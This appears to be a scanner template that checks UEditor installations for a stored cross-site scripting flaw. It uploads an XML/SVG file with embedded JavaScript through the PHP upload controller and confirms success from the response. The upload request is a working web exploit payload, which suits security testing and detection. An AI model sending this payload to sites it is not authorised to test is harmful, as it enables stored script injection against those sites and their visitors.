id: ueditor-xss
brief:
    title: ueditor - Cross Site Scripting
    by: pwnhxl
    level: high
    about: The latest vulnerability version of UEditor, a rich text web editor, allows for XML file uploads which can lead to stored cross-site scripting (XSS) attacks.
    label:
        - ueditor
        - xss
        - intrusive
        - vuln
    score: CVSS:7.2
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/ueditor/php/controller.php?action=uploadfile'
      head:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstring}}
      body: |-
        ------WebKitFormBoundary{{randstring}}
        Content-Disposition: form-data; name="upfile"; filename="test.xml"
        Content-Type: application/vnd.ms-excel

        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
           <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
           <script type="text/javascript">
              alert(document.domain);
           </script>
        </svg>
        ------WebKitFormBoundary{{randstring}}--
      signs:
        - "on": word
          has:
            - state":"SUCCESS
            - .xml","title
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
